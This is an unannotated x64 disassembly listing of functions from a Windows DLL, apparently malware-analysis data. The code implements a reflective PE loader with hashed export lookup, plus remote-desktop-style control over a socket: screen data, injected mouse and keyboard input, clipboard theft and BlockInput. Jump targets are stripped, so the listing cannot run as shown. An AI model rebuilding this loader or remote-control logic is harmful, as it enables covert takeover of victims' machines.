sub_180007de0
push rbx
sub rsp 0x40
and [ rsp + 0x30 ] 0x0
mov rax rdx
xor r9d r9d
mov rbx rcx
lea r8d [ r9 + 0x1 ]
mov edx 0x80000000
mov rcx rax
mov [ rsp + 0x28 ] 0x80
mov [ rsp + 0x20 ] 0x3
call [ CreateFileW@IAT ]
mov [ rbx + 0x10 ] rax
cmp rax 0xffffffffffffffff
jne r-xdata
xor edx edx
mov rcx rax
call [ GetFileSize@IAT ]
mov [ rbx + 0x8 ] eax
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x20 ]
mov rcx [ rbx + 0x10 ]
call [ CloseHandle@IAT ]
jmp r-xdata
add rsp 0x40
pop rbx
retn
sub_180007e54
push rbx
sub rsp 0x30
mov edx [ rcx + 0x8 ]
mov rbx rcx
xor ecx ecx
lea r9d [ rcx + 0x40 ]
mov r8d 0x1000
call [ VirtualAlloc@IAT ]
mov [ rbx + 0x18 ] rax
test rax rax
jne r-xdata
mov r8d [ rbx + 0x8 ]
mov rcx [ rbx + 0x10 ]
and [ rsp + 0x40 ] 0x0
and [ rsp + 0x20 ] 0x0
lea r9 [ rsp + 0x40 ]
mov rdx rax
call [ ReadFile@IAT ]
mov rcx [ rbx + 0x10 ]
call [ CloseHandle@IAT ]
mov rcx [ rbx + 0x18 ]
mov eax 0x5a4d
cmp [ rcx ] ax
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ rcx + 0x3c ]
add eax ecx
cmp [ rax ] 0x4550
jne r-xdata
mov r8d 0x8000
xor edx edx
call [ VirtualFree@IAT ]
and [ rbx + 0x18 ] 0x0
jmp r-xdata
add rsp 0x30
pop rbx
retn
mov edx [ rax + 0x50 ]
xor ecx ecx
mov r8d 0x1000
lea r9d [ rcx + 0x40 ]
call [ VirtualAlloc@IAT ]
mov r8 rax
mov [ rbx + 0x20 ] rax
test rax rax
jne r-xdata
mov rax [ rbx ]
mov rdx [ rbx + 0x18 ]
mov rcx rbx
call [ rax + 0x28 ]
mov rcx [ rbx + 0x18 ]
xor edx edx
mov r8d 0x8000
call [ VirtualFree@IAT ]
mov r11 [ rbx ]
mov rdx [ rbx + 0x20 ]
mov rcx rbx
call [ r11 + 0x30 ]
mov r11 [ rbx ]
mov rdx [ rbx + 0x20 ]
mov rcx rbx
call [ r11 + 0x38 ]
mov r11 [ rbx ]
mov rcx rbx
call [ r11 + 0x40 ]
mov eax 0x1
mov rcx [ rbx + 0x18 ]
jmp r-xdata
sub_180007f54
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
movsxd rbx [ rdx + 0x3c ]
mov r12 r8
mov rbp rdx
add rbx rdx
mov rcx r12
movsxd r8 [ rbx + 0x54 ]
movzx esi [ rbx + 0x14 ]
movzx edi [ rbx + 0x6 ]
call sub_1800160e0
test edi edi
jle r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
add rsp 0x20
pop r12
retn
lea rbx [ rsi + rbx + 0x2c ]
mov edx [ rbx ]
mov ecx [ rbx - 0x8 ]
mov r8d [ rbx - 0x4 ]
add rdx rbp
add rcx r12
call sub_1800160e0
add rbx 0x28
sub rdi 0x1
jne r-xdata
sub_180007fd0
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r14
sub rsp 0x20
movsxd rax [ rdx + 0x3c ]
mov rsi rdx
mov ebx [ rax + rdx + 0x90 ]
add rbx rdx
jmp r-xdata
cmp [ rbx + 0x10 ] 0x0
jne r-xdata
cmp [ rbx + 0xc ] 0x0
je r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
add rsp 0x20
pop r14
pop r13
pop r12
retn
mov ecx [ rbx + 0xc ]
add rcx rsi
call [ GetModuleHandleA@IAT ]
mov r14 rax
test rax rax
jne r-xdata
cmp [ rbx ] 0x0
je r-xdata
mov ecx [ rbx + 0xc ]
add rcx rsi
call [ LoadLibraryA@IAT ]
mov r14 rax
mov edi [ rbx + 0x10 ]
mov edi [ rbx ]
jmp r-xdata
add rbx 0x14
mov rax rdi
xor ebp ebp
mov r13d [ rbx + 0x10 ]
add rdi rsi
xor r12d r12d
add r13 rsi
cmp [ rdi ] r12
je r-xdata
lea rdx [ rcx + rsi + 0x2 ]
mov rdx 0x7fffffffffffffff
and rdx rcx
jmp r-xdata
mov rcx [ rax ]
mov rax 0x8000000000000000
test rax rcx
je r-xdata
mov rcx r14
call [ GetProcAddress@IAT ]
inc r12
mov [ r13 + rbp ] rax
mov rbp r12
shl rbp 0x3
lea rax [ rdi + rbp ]
cmp [ rax ] 0x0
jne r-xdata
sub_1800080c8
mov [ rsp + 0x8 ] rbx
movsxd r11 [ rdx + 0x3c ]
mov r9 rdx
mov r8d [ r11 + rdx + 0xb0 ]
add r8 rdx
xor ebx ebx
jmp r-xdata
cmp [ r8 ] ebx
jne r-xdata
mov eax [ r8 + 0x4 ]
cmp eax ebx
je r-xdata
mov rbx [ rsp + 0x8 ]
retn
add eax 0xfffffff8
shr eax 0x1
mov r10d eax
cmp r10 rbx
jle r-xdata
mov eax [ r8 + 0x4 ]
add r8 rax
lea rdx [ r8 + 0x8 ]
add rdx 0x2
sub r10 0x1
jne r-xdata
mov ecx [ r8 ]
and eax 0xfff
add rax r9
add rcx rax
movsxd rax r9d
sub rax [ r11 + r9 + 0x30 ]
add [ rcx ] rax
mov ax [ rdx ]
cmp ax bx
je r-xdata
sub_18000813c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
mov r10 [ rcx + 0x20 ]
mov esi edx
xor edx edx
mov eax [ r10 + 0x3c ]
add eax r10d
mov ecx [ rax + 0x88 ]
add ecx r10d
mov r9d [ rcx + 0x20 ]
mov ebx [ rcx + 0x24 ]
mov edi [ rcx + 0x1c ]
mov r11d [ rcx + 0x18 ]
add r9d r10d
add ebx r10d
add edi r10d
test r11d r11d
je r-xdata
xor eax eax
mov eax [ r9 ]
xor ecx ecx
lea r8d [ r10 + rax ]
jmp r-xdata
mov al [ r8 ]
test al al
jne r-xdata
ror ecx 0x7
movsx eax al
add ecx eax
inc r8
cmp ecx esi
je r-xdata
movsxd rax edx
movzx ecx [ rbx + rax * 2 ]
mov eax [ rdi + rcx * 4 ]
add eax r10d
jmp r-xdata
inc edx
add r9 0x4
cmp edx r11d
jb r-xdata
mov rbx [ rsp + 0x8 ]
mov rsi [ rsp + 0x10 ]
mov rdi [ rsp + 0x18 ]
retn
sub_1800081d4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
mov eax [ rdx + 0x3c ]
mov esi r8d
mov r11 rdx
add eax edx
mov ecx [ rax + 0x88 ]
add ecx edx
mov r9d ecx
mov r10d [ rcx + 0x20 ]
mov ebx [ rcx + 0x24 ]
mov edi [ rcx + 0x1c ]
mov r9d [ r9 + 0x18 ]
add r10d edx
add ebx edx
add edi edx
xor ecx ecx
test r9d r9d
je r-xdata
xor eax eax
mov eax [ r10 ]
add eax r11d
xor edx edx
mov r8d eax
mov al [ rax ]
jmp r-xdata
test al al
jne r-xdata
ror edx 0x7
movsx eax al
add edx eax
inc r8
mov al [ r8 ]
cmp edx esi
je r-xdata
movsxd rax ecx
movzx ecx [ rbx + rax * 2 ]
mov eax [ rdi + rcx * 4 ]
add eax r11d
jmp r-xdata
inc ecx
add r10 0x4
cmp ecx r9d
jb r-xdata
mov rbx [ rsp + 0x8 ]
mov rsi [ rsp + 0x10 ]
mov rdi [ rsp + 0x18 ]
retn
sub_180008268
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x40
mov rsi r8
lea r8 [ rsp + 0x30 ]
mov rcx 0xffffffff80000002
mov rdi r9
call [ RegOpenKeyW@IAT ]
xor ebx ebx
cmp eax ebx
jne r-xdata
mov rsi [ rsp + 0x58 ]
mov eax ebx
mov rbx [ rsp + 0x50 ]
add rsp 0x40
pop rdi
retn
mov rcx [ rsp + 0x30 ]
lea rax [ rsp + 0x70 ]
xor r9d r9d
mov [ rsp + 0x28 ] rax
xor r8d r8d
mov rdx rsi
mov [ rsp + 0x20 ] rdi
call [ RegQueryValueExW@IAT ]
mov ecx [ rsp + 0x70 ]
cmp eax ebx
cmovne ecx ebx
mov [ rsp + 0x70 ] ecx
mov rcx [ rsp + 0x30 ]
call [ RegCloseKey@IAT ]
mov ebx [ rsp + 0x70 ]
sub_1800082e8
mov r11 rsp
mov [ r11 + 0x8 ] rbx
mov [ r11 + 0x10 ] rsi
push rdi
sub rsp 0xa0
mov [ rsp + 0x20 ] 0x7f8a
lea rax [ r--data ]
mov rbx rcx
mov [ r11 - 0x80 ] 0x7f00
mov [ r11 - 0x78 ] 0x7f03
mov [ r11 - 0x70 ] 0x7f89
mov [ rcx ] rax
mov [ r11 - 0x68 ] 0x7f8b
mov [ r11 - 0x60 ] 0x7f01
mov [ r11 - 0x58 ] 0x7f81
mov [ r11 - 0x50 ] 0x7f88
mov [ r11 - 0x48 ] 0x7f80
mov [ r11 - 0x40 ] 0x7f86
mov [ r11 - 0x38 ] 0x7f83
mov [ r11 - 0x30 ] 0x7f85
mov [ r11 - 0x28 ] 0x7f82
mov [ r11 - 0x20 ] 0x7f84
mov [ r11 - 0x18 ] 0x7f04
mov [ r11 - 0x10 ] 0x7f02
xor edi edi
lea rsi [ rcx + 0x88 ]
mov rdx [ rsp + rdi * 8 + 0x20 ]
xor ecx ecx
mov [ rsi - 0x80 ] rdx
call [ LoadCursorW@IAT ]
inc rdi
mov [ rsi ] rax
add rsi 0x8
cmp rdi 0x10
jl r-xdata
lea r11 [ rsp + 0xa0 ]
mov rax rbx
mov rbx [ r11 + 0x10 ]
mov rsi [ r11 + 0x18 ]
mov rsp r11
pop rdi
retn
sub_1800083cc
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov ebp edx
mov rbx rcx
lea rdi [ rcx + 0x88 ]
mov esi 0x10
mov [ rcx ] rax
mov rcx [ rdi ]
call [ DestroyCursor@IAT ]
add rdi 0x8
sub rsi 0x1
jne r-xdata
test bpl 0x1
je r-xdata
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rbx
call j_sub_18000e06c
sub_180008434
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rbx rdx
mov rdi rcx
call sub_18000a224
xor r9d r9d
mov r8d 0x1ffe
mov rdx rbx
mov rcx rdi
call [ recv@IAT ]
mov rbx [ rsp + 0x30 ]
xor ecx ecx
cmp eax ecx
cmovle eax ecx
add rsp 0x20
pop rdi
retn
sub_180008470
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
mov eax 0x2020
call sub_1800232c0
sub rsp rax
mov r8 rcx
mov rsi rcx
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_18000c710
mov ecx 0x148
call sub_18000dc18
test rax rax
je r-xdata
xor ebx ebx
jmp r-xdata
mov rdx rsi
mov rcx rax
call sub_180008624
mov rbx rax
jmp r-xdata
lea rdx [ rsp + 0x20 ]
mov r8d 0x1ffe
mov rcx rsi
call sub_180008434
mov edi eax
test eax eax
jne r-xdata
movzx ecx [ rsp + 0x20 ]
cmp ecx 0x16
jg r-xdata
mov rcx rsi
call [ closesocket@IAT ]
test rbx rbx
je r-xdata
sub ecx 0x17
je r-xdata
je r-xdata
lea rdx [ r--data ]
lea rcx [ rw-data ]
lea r11 [ rsp + 0x2020 ]
mov rbx [ r11 + 0x10 ]
mov rsi [ r11 + 0x18 ]
mov rsp r11
pop rdi
jmp sub_18000c710
mov rax [ rbx ]
mov edx 0x1
mov rcx rbx
call [ rax ]
cmp [ rsp + 0x21 ] 0x0
mov rcx [ rbx + 0x140 ]
setne dl
mov [ rbx + 0x21 ] dl
call sub_180009a30
sub ecx 0x1
je r-xdata
cmp [ rsp + 0x21 ] 0x0
setne al
mov [ rbx + 0x12 ] al
jmp r-xdata
sub ecx 0x11
je r-xdata
mov rcx rbx
call sub_180008f74
jmp r-xdata
sub ecx 0x1
je r-xdata
movzx edx [ rsp + 0x21 ]
mov rcx rbx
call sub_1800087e0
jmp r-xdata
sub ecx 0x1
je r-xdata
lea r8d [ rdi - 0x1 ]
lea rdx [ rsp + 0x21 ]
mov rcx rbx
call sub_180008ee4
jmp r-xdata
cmp ecx 0x5
jne r-xdata
movzx eax [ rsp + 0x21 ]
mov rcx [ rbx + 0x140 ]
mov edx eax
mov [ rbx + 0x20 ] al
call sub_18000970c
jmp r-xdata
sub ecx 0x1
je r-xdata
mov rcx rbx
call sub_180008afc
jmp r-xdata
call sub_18000b8c4
jmp r-xdata
sub ecx 0x1
je r-xdata
xor ecx ecx
call [ BlockInput@IAT ]
lea r8d [ rdi - 0x1 ]
lea rdx [ rsp + 0x21 ]
mov rcx rbx
call sub_180008d30
movzx ecx [ rbx + 0x11 ]
call [ BlockInput@IAT ]
jmp r-xdata
cmp ecx 0x1
jne r-xdata
cmp [ rsp + 0x21 ] 0x0
setne al
mov [ rbx + 0x11 ] al
jmp r-xdata
sub_180008624
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x40
lea rax [ r--data ]
mov rbx rcx
mov rdi rdx
mov [ rcx ] rax
add rcx 0x38
call sub_1800082e8
mov ecx 0x1e0
mov [ rbx + 0x20 ] 0x1
mov [ rbx + 0x24 ] 0x8
call sub_18000dc18
test rax rax
je r-xdata
xor eax eax
mov r9d 0x64
xor r8d r8d
mov rcx rax
lea edx [ r9 - 0x5c ]
call sub_180009064
jmp r-xdata
xor r9d r9d
xor r8d r8d
xor ecx ecx
lea edx [ r9 + 0x1 ]
mov [ rbx + 0x140 ] rax
mov [ rbx + 0x10 ] 0x1
mov [ rbx + 0x12 ] 0x0
mov [ rbx + 0x11 ] 0x0
mov [ rbx + 0x21 ] 0x0
mov [ rbx + 0x8 ] rdi
call [ CreateEventW@IAT ]
mov [ rsp + 0x30 ] 0x1
and [ rsp + 0x28 ] 0x0
and [ rsp + 0x20 ] 0x0
lea r8 [ sub_180008b2c ]
mov r9 rbx
xor edx edx
xor ecx ecx
mov [ rbx + 0x18 ] rax
call sub_18000b67c
mov [ rsp + 0x30 ] 0x1
and [ rsp + 0x28 ] 0x0
and [ rsp + 0x20 ] 0x0
lea r8 [ sub_180008c18 ]
mov r9 rbx
xor edx edx
xor ecx ecx
mov [ rbx + 0x28 ] rax
call sub_18000b67c
mov [ rbx + 0x30 ] rax
mov rax rbx
mov rbx [ rsp + 0x50 ]
add rsp 0x40
pop rdi
retn
sub_180008708
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov ebx edx
mov rdi rcx
call sub_180008738
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_18000e06c
sub_180008738
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov rbx rcx
or edi 0xffffffff
mov [ rcx ] rax
xor eax eax
mov edx edi
xchg [ rcx + 0x12 ] eax
xor eax eax
xchg [ rcx + 0x10 ] eax
mov rcx [ rcx + 0x28 ]
call [ WaitForSingleObject@IAT ]
mov rcx [ rbx + 0x30 ]
mov edx edi
call [ WaitForSingleObject@IAT ]
mov rcx [ rbx + 0x28 ]
call [ CloseHandle@IAT ]
mov rcx [ rbx + 0x30 ]
call [ CloseHandle@IAT ]
mov rcx [ rbx + 0x18 ]
call [ CloseHandle@IAT ]
mov rcx [ rbx + 0x140 ]
test rcx rcx
je r-xdata
lea rax [ r--data ]
add rbx 0xc0
mov edi 0x10
mov [ rbx - 0x88 ] rax
mov rax [ rcx ]
mov edx 0x1
call [ rax ]
mov rcx [ rbx ]
call [ DestroyCursor@IAT ]
add rbx 0x8
sub rdi 0x1
jne r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_1800087e0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x40
mov rbx rcx
mov [ rcx + 0x10 ] 0x0
mov rcx [ rcx + 0x28 ]
mov edi edx
or edx 0xffffffff
call [ WaitForSingleObject@IAT ]
mov rcx [ rbx + 0x28 ]
call [ CloseHandle@IAT ]
mov rcx [ rbx + 0x140 ]
test rcx rcx
je r-xdata
mov ecx 0x1e0
call sub_18000dc18
cmp edi 0x3
jne r-xdata
mov rax [ rcx ]
mov edx 0x1
call [ rax ]
cmp edi 0x7
jne r-xdata
test rax rax
je r-xdata
test rax rax
je r-xdata
test rax rax
je r-xdata
xor eax eax
mov r8b 0x1
lea edx [ rdi + 0x1 ]
jmp r-xdata
xor r8d r8d
mov edx edi
mov r8b 0x1
lea edx [ rdi + 0x1 ]
jmp r-xdata
mov r9d 0x64
mov rcx rax
call sub_180009064
jmp r-xdata
movzx edx [ rbx + 0x20 ]
mov rcx rax
mov [ rbx + 0x140 ] rax
call sub_18000970c
mov dl [ rbx + 0x21 ]
mov rcx [ rbx + 0x140 ]
call sub_180009a30
mov [ rsp + 0x30 ] 0x1
and [ rsp + 0x28 ] 0x0
and [ rsp + 0x20 ] 0x0
lea r8 [ sub_180008b2c ]
mov r9 rbx
xor edx edx
xor ecx ecx
mov [ rbx + 0x24 ] edi
mov [ rbx + 0x10 ] 0x1
call sub_18000b67c
mov [ rbx + 0x28 ] rax
mov rbx [ rsp + 0x50 ]
add rsp 0x40
pop rdi
retn
sub_1800088c8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rsi rcx
mov rcx [ rcx + 0x140 ]
call sub_180009a50
xor ecx ecx
mov r8d 0x1000
lea edi [ rax + 0x5 ]
lea r9d [ rcx + 0x4 ]
mov edx edi
call [ VirtualAlloc@IAT ]
lea r8d [ rdi - 0x1 ]
mov [ rax ] 0x73
mov [ rax + 0x1 ] edi
mov rcx [ rsi + 0x140 ]
mov rbx rax
call sub_180009a48
lea rcx [ rbx + 0x5 ]
mov rdx rax
call sub_1800160e0
mov r8d edi
mov rdx rbx
mov rcx rsi
call sub_180008a68
xor edx edx
mov r8d 0x8000
mov rcx rbx
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
jmp [ VirtualFree@IAT ]
sub_180008954
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x140 ]
call sub_180009894
mov rdi rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
mov rcx [ rbx + 0x140 ]
call sub_180009a24
lea esi [ rax + 0x5 ]
mov ecx esi
call j_sub_18000dc18
mov rbp rax
test rax rax
je r-xdata
lea r8d [ rsi - 0x5 ]
lea rcx [ rax + 0x5 ]
mov rdx rdi
mov [ rax ] 0x74
mov [ rax + 0x1 ] esi
call sub_1800160e0
mov r8d esi
mov rdx rbp
mov rcx rbx
call sub_180008a68
mov rcx rbp
call j_sub_18000e06c#2
sub_1800089e0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
push rsi
push rdi
push r12
sub rsp 0x20
mov r12 rcx
mov rcx [ rcx + 0x140 ]
lea rdx [ rsp + 0x40 ]
call sub_1800093ec
mov ebx [ rsp + 0x40 ]
mov rsi rax
test ebx ebx
je r-xdata
mov rbx [ rsp + 0x48 ]
mov rbp [ rsp + 0x50 ]
add rsp 0x20
pop r12
pop rdi
pop rsi
retn
test rax rax
je r-xdata
lea ebp [ rbx + 0x5 ]
mov ecx ebp
call j_sub_18000dc18
mov rdi rax
test rax rax
je r-xdata
lea rcx [ rax + 0x5 ]
mov r8 rbx
mov rdx rsi
mov [ rax ] 0x75
mov [ rax + 0x1 ] ebp
call sub_1800160e0
mov r8d ebp
mov rdx rdi
mov rcx r12
call sub_180008a68
mov rcx rdi
call j_sub_18000e06c#2
sub_180008a68
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x20 ] rsi
push rdi
sub rsp 0x20
mov rsi rcx
mov rcx [ rcx + 0x8 ]
mov ebx r8d
mov rbp rdx
lea r8 [ rax + 0x18 ]
xor edi edi
and [ rax + 0x18 ] edi
mov edx 0x8004667e
call [ ioctlsocket@IAT ]
test ebx ebx
jle r-xdata
call [ GetLastError@IAT ]
mov [ rsi + 0x10 ] 0x0
xor al al
mov rcx [ rsi + 0x8 ]
movsxd rdx edi
xor r9d r9d
add rdx rbp
cmp ebx 0x1000
mov r8d 0x1000
jg r-xdata
call [ send@IAT ]
test eax eax
jle r-xdata
mov r8d ebx
test edi edi
jle r-xdata
sub ebx eax
add edi eax
test ebx ebx
jg r-xdata
mov al 0x1
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x20
pop rdi
retn
sub_180008b2c
push rdi
sub rsp 0x40
mov [ rsp + 0x30 ] 0xfffffffffffffffe
mov [ rsp + 0x68 ] rbx
mov rdi rcx
call sub_1800088c8
mov rcx rdi
call sub_180008b08
and [ rsp + 0x50 ] 0x0
call [ GetCurrentProcessId@IAT ]
mov ecx eax
lea rdx [ rsp + 0x50 ]
call [ ProcessIdToSessionId@IAT ]
mov r8d [ rsp + 0x50 ]
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_18000c710
and [ rsp + 0x60 ] 0x0
and [ rsp + 0x58 ] 0x0
lea rax [ rsp + 0x58 ]
mov [ rsp + 0x20 ] rax
lea r9 [ rsp + 0x60 ]
mov r8d 0x8
mov edx [ rsp + 0x50 ]
xor ecx ecx
call WTSQuerySessionInformationW
test eax eax
je r-xdata
mov rcx rdi
call sub_180008954
nop
cmp [ rsp + 0x58 ] 0x4
jne r-xdata
xor eax eax
mov rcx rdi
call sub_1800089e0
jmp r-xdata
mov rcx [ rsp + 0x60 ]
mov ebx [ rcx ]
call WTSFreeMemory
test ebx ebx
jne r-xdata
cmp [ rdi + 0x10 ] 0x0
je r-xdata
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_18000c710
xor eax eax
jmp r-xdata
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_18000c710
jmp r-xdata
mov rbx [ rsp + 0x68 ]
add rsp 0x40
pop rdi
retn
sub_180008c18
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rbx rcx
call sub_18000905c
mov sil al
test al al
je r-xdata
xor ecx ecx
call [ BlockInput@IAT ]
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
or eax 0xffffffff
add rsp 0x20
pop rdi
retn
xor edi edi
cmp [ rbx + 0x12 ] 0x0
je r-xdata
mov rcx rbx
call sub_180009014
test al al
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
xor r9d r9d
xor r8d r8d
lea edx [ r9 + 0x1 ]
lea ecx [ rdx + 0x55 ]
call [ SystemParametersInfoW@IAT ]
mov edx 0x112
mov ecx 0xffff
mov r9d 0x2
mov r8d 0xf170
call [ SendMessageW@IAT ]
mov [ rw-data ] 0x1
jmp r-xdata
mov ecx 0xa
call [ Sleep@IAT ]
inc edi
cmp edi 0x64
jl r-xdata
mov rcx rbx
call sub_180009060
mov edx eax
call sub_1800087e0
movzx ecx [ rbx + 0x11 ]
call [ BlockInput@IAT ]
mov rcx rbx
call sub_180009014
test al al
je r-xdata
xor edx edx
xor r9d r9d
xor r8d r8d
lea ecx [ rdx + 0x56 ]
call [ SystemParametersInfoW@IAT ]
or r9 0xffffffffffffffff
mov edx 0x112
mov ecx 0xffff
mov r8d 0xf170
call [ SendMessageW@IAT ]
mov [ rw-data ] 0x0
test sil sil
je r-xdata
mov rcx rbx
call sub_180009060
mov edx eax
call sub_1800087e0
jmp r-xdata
sub_180008d30
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x30
mov ecx r8d
mov rax 0xaaaaaaaaaaaaaaab
mov rdi rdx
mul rcx
mov rbx rdx
shr rbx 0x5
lea rax [ rbx + rbx * 2 ]
shl rax 0x4
sub rcx rax
jne r-xdata
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
call sub_18000b6ec
movsxd rsi ebx
test ebx ebx
jle r-xdata
lea rbx [ rdi + 0x10 ]
mov edi 0x2
mov eax [ rbx - 0x8 ]
cmp eax 0x203
ja r-xdata
movzx ecx [ rbx + 0x8 ]
movzx edx [ rbx + 0xa ]
mov [ rsp + 0x58 ] ecx
mov [ rsp + 0x5c ] edx
call [ SetCursorPos@IAT ]
mov rcx [ rsp + 0x58 ]
call [ WindowFromPoint@IAT ]
mov rcx rax
call [ SetCapture@IAT ]
sub eax 0x204
je r-xdata
je r-xdata
mov ecx 0x8
sub eax 0x1
je r-xdata
and [ rsp + 0x20 ] 0x0
xor edx edx
xor r9d r9d
lea ecx [ rdx + 0x6 ]
xor r8d r8d
call [ mouse_event@IAT ]
mov ecx 0x6
jmp r-xdata
sub eax 0x100
je r-xdata
mov eax [ rbx - 0x8 ]
add eax 0xfffffe00
cmp eax 0x8
ja r-xdata
mov ecx 0x10
jmp r-xdata
sub eax 0x1
je r-xdata
xor r9d r9d
mov ecx [ rbx ]
xor edx edx
call [ MapVirtualKeyW@IAT ]
xor r9d r9d
xor r8d r8d
sub eax 0x1
je r-xdata
and [ rsp + 0x20 ] 0x0
xor edx edx
xor r9d r9d
lea ecx [ rdx + 0x18 ]
xor r8d r8d
call [ mouse_event@IAT ]
mov ecx 0x18
jmp r-xdata
sub eax 0x1
je r-xdata
add rbx 0x30
sub rsi 0x1
jne r-xdata
mov ecx [ rbx ]
xor edx edx
call [ MapVirtualKeyW@IAT ]
xor r9d r9d
mov r8d edi
jmp r-xdata
sub eax 0x3
je r-xdata
mov ecx 0x20
jmp r-xdata
sub eax 0x1
je r-xdata
mov cl [ rbx ]
mov edx eax
call [ keybd_event@IAT ]
jmp r-xdata
sub eax 0x1
je r-xdata
mov ecx 0x40
jmp r-xdata
cmp eax edi
jne r-xdata
sub eax 0xfc
je r-xdata
movsx r9d [ rbx + 0x2 ]
mov ecx 0x800
jmp r-xdata
mov ecx edi
jmp r-xdata
cmp eax 0x1
jne r-xdata
and [ rsp + 0x20 ] 0x0
xor r8d r8d
xor edx edx
call [ mouse_event@IAT ]
lea ecx [ rax + 0x3 ]
jmp r-xdata
sub_180008ee4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
xor ecx ecx
movsxd rbx r8d
mov rsi rdx
call [ OpenClipboard@IAT ]
test eax eax
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
call [ EmptyClipboard@IAT ]
mov rdx rbx
mov ecx 0x2000
mov rdi rbx
call [ GlobalAlloc@IAT ]
mov rbx rax
test rax rax
je r-xdata
call [ CloseClipboard@IAT ]
mov rcx rax
call [ GlobalLock@IAT ]
mov r8 rdi
mov rdx rsi
mov rcx rax
call sub_1800160e0
mov rcx rbx
call [ GlobalUnlock@IAT ]
mov rdx rbx
mov ecx 0x1
call [ SetClipboardData@IAT ]
mov rcx rbx
call [ GlobalFree@IAT ]
sub_180008f74
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
xor ecx ecx
call [ OpenClipboard@IAT ]
test eax eax
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
mov ecx 0x1
call [ GetClipboardData@IAT ]
mov rbp rax
test rax rax
jne r-xdata
mov rcx rax
call [ GlobalSize@IAT ]
mov rcx rbp
lea edi [ rax + 0x1 ]
call [ GlobalLock@IAT ]
movsxd rcx edi
mov rbx rax
call j_sub_18000dc18
lea ecx [ rdi - 0x1 ]
movsxd r8 ecx
lea rcx [ rax + 0x1 ]
mov rdx rbx
mov rsi rax
mov [ rax ] 0x76
call sub_1800160e0
mov rcx rbp
call [ GlobalUnlock@IAT ]
call [ CloseClipboard@IAT ]
mov rcx rsi
call j_sub_18000e06c#2
call [ CloseClipboard@IAT ]
jmp r-xdata
sub_180009014
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rcx [ rcx + 0x140 ]
call sub_180009a48
xor ecx ecx
mov rdi rax
call [ GetSystemMetrics@IAT ]
mov ebx 0x1
cmp [ rdi + 0x4 ] eax
jne r-xdata
mov al bl
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov ecx ebx
call [ GetSystemMetrics@IAT ]
cmp [ rdi + 0x8 ] eax
jne r-xdata
xor ebx ebx
sub_180009064
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
